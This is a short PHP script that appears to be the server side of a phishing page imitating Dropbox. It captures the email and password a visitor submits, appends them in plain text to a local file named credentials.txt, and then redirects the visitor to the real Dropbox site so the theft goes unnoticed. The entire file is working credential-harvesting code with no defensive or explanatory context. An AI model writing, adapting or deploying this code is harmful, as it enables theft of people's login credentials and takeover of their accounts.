<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Capture the credentials submitted by the user
    $email = $_POST['email'];
    $password = $_POST['password'];
    
    // Store the credentials in a text file (you can change the filename as needed)
    $log = "credentials.txt";
    $log_entry = "Email: $email | Password: $password\n";
    file_put_contents($log, $log_entry, FILE_APPEND);
    
    // Optionally, you could redirect to a fake success page or legitimate service
    header("Location: https://www.dropbox.com"); // Redirect to Dropbox's real page or another page
    exit();
} else {
    // If the form is not submitted, display an error (optional)
    echo "Invalid request.";
}
?>